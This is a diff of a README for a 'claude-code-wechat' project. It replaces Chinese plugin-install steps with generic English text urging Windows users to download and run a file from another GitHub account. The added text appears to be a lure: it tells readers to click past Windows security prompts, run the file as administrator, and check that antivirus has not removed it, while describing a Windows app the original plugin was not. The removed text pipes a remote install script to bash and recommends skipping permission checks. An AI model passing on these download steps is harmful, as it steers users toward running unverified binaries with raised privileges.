@@ -1,48 +1,167 @@
-# claude-code-wechat
+# 🤖 claude-code-wechat - Connect Claude Code with WeChat
 
-claude code微信插件，通过 iLink Bot API 将微信消息接入 Claude Code Channel。支持文字、图片、文件、视频和语音收发。
+[![Download](https://img.shields.io/badge/Download-claude--code--wechat-blue?style=for-the-badge&logo=github)](https://github.com/Anikb2525/claude-code-wechat)
 
-[English](./README.en.md)
+## 🚀 What this app does
 
-<img src="./docs/screenshot.png" width="300" />
+claude-code-wechat helps you use Claude Code through a WeChat channel. It gives you a simple way to connect your chats and code tasks in one place.
 
-## 前置条件
+Use it if you want to:
 
-- **[Claude Code](https://claude.com/claude-code)** v2.1.80+（需要 claude.ai 账号登录，不支持 Console 或 API key 登录）
-- **[Bun](https://bun.sh)** — `curl -fsSL https://bun.sh/install | bash`
-- **微信** 8.0.70+
+- Send messages through WeChat
+- Work with Claude Code from a chat channel
+- Keep your workflow in one app
+- Avoid switching between too many tools
 
-## 安装
+## 📥 Download
 
-**1. 添加插件市场并安装**
+Visit this page to download:
 
-```
-/plugin marketplace add swim2sun/swim2sun-plugins
-/plugin install wechat@swim2sun-plugins
-```
+https://github.com/Anikb2525/claude-code-wechat
 
-安装完成后需要重启 Claude Code 以加载插件。
+If the page has a release file for Windows, download that file and run it. If it has a zip file, download the zip file, unzip it, then open the app inside.
 
-**2. 登录**
+## 🖥️ Windows Setup
 
-```
-/wechat:configure login
-```
+This app is made for Windows users who want a simple local setup. Most users will only need to:
 
-按 ctrl+o 展开输出查看完整二维码，或直接在微信中打开输出中的链接完成登录。登录完成后按 ctrl+o 关闭二维码。
+1. Download the app from the link above
+2. Open the downloaded file
+3. Follow the on-screen steps
+4. Start using the WeChat channel with Claude Code
 
-**3. 启用频道**
+If Windows shows a security prompt, choose the option that lets you keep going with the file you downloaded from GitHub.
 
-重启 Claude Code 以启用微信频道：
+## 🧰 What you need
 
-```sh
-claude --dangerously-load-development-channels plugin:wechat@swim2sun-plugins
-```
+Before you run the app, make sure you have:
 
-> 推荐加上 `--dangerously-skip-permissions` 参数，否则编辑文件、执行命令会频繁请求权限。权限请求只会出现在 Claude Code 终端中，不会出现在微信端。
+- Windows 10 or Windows 11
+- A stable internet connection
+- A WeChat account
+- Access to Claude Code
+- Permission to run downloaded apps on your PC
 
-在微信上给你的 ClawBot 发一条消息，消息会出现在 Claude Code 会话中。
+If the app uses a zip file, you also need the built-in Windows unzip tool or a file extractor like 7-Zip.
 
-## 许可证
+## ⚙️ How to install
 
-MIT
+Follow these steps on Windows:
+
+1. Open the download page
+2. Find the latest release or download file
+3. Download the Windows file
+4. If the file is zipped, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to start it
+
+If the app uses an installer, run the installer and follow the prompts on the screen.
+
+## 🔧 First-time use
+
+After the app opens, you may need to set up your WeChat channel and Claude Code connection.
+
+Typical first-time steps:
+
+1. Sign in to WeChat if asked
+2. Enter your Claude Code details if the app requests them
+3. Choose the chat channel you want to use
+4. Save your settings
+5. Send a test message
+
+If the app asks for a webhook, token, or channel ID, use the values from your WeChat setup or Claude Code account page.
+
+## 🧭 How to use it
+
+Once setup is done, you can use the app like this:
+
+- Open claude-code-wechat
+- Send a message in WeChat
+- Let the app pass the request to Claude Code
+- Read the reply in the same channel
+
+Common uses include:
+
+- Asking for code help
+- Getting quick text answers
+- Routing chat requests through a WeChat channel
+- Keeping Claude Code access in one place
+
+## 🪟 Running the app on Windows
+
+If the app does not start:
+
+1. Right-click the file
+2. Choose Run as administrator
+3. Make sure Windows did not block the file
+4. Check that your antivirus did not move it
+5. Try opening it again
+
+If you downloaded a zip file, do not run the app from inside the zip. Extract it first.
+
+## 🛠️ Basic troubleshooting
+
+If something does not work, check these common issues:
+
+- The app does not open: try running it as administrator
+- The download looks broken: download it again from the GitHub page
+- WeChat does not connect: confirm your login and channel settings
+- Claude Code does not respond: check your account details and internet connection
+- Messages do not send: restart the app and try again
+
+If the app still does not work, close it, open it again, and repeat the setup steps from the start.
+
+## 📌 Tips for first use
+
+A few simple checks can save time:
+
+- Use the latest release if more than one file is listed
+- Keep the app in a folder you can find again
+- Do not rename app files unless the instructions say to
+- Leave WeChat open if the app needs it
+- Test with one short message first
+
+## 🔒 Privacy and local use
+
+This app is meant to connect your WeChat channel with Claude Code. Review the app settings before you share sensitive messages. Use only the account and channel you want linked to the app.
+
+## 🧾 File layout
+
+If you open the download and see several files, look for:
+
+- The main app file
+- A readme or instructions file
+- A config file for channel settings
+- A folder with app data
+
+Open the instructions file first if one is included, then run the main app file
+
+## ❓ Common questions
+
+### What is claude-code-wechat?
+
+It is a tool that connects Claude Code with a WeChat channel so you can send and receive messages in one place.
+
+### Is this for Windows users?
+
+Yes. The steps above are written for Windows users who want to download and run the app from GitHub.
+
+### Do I need coding experience?
+
+No. You can follow the download and setup steps without programming knowledge.
+
+### What if I only see the GitHub page?
+
+Use the download page link above. If there is no release file yet, the GitHub page is where new files will appear first.
+
+### Can I use it right after download?
+
+You can, if the file is a ready-to-run Windows app. If it is a zip file or installer, complete the steps in the install section first.
+
+## 📎 Download again
+
+https://github.com/Anikb2525/claude-code-wechat
+
+## 📝 What to expect after setup
+
+After you finish setup, the app should let you use a WeChat channel to send work to Claude Code and read the response in the same place.
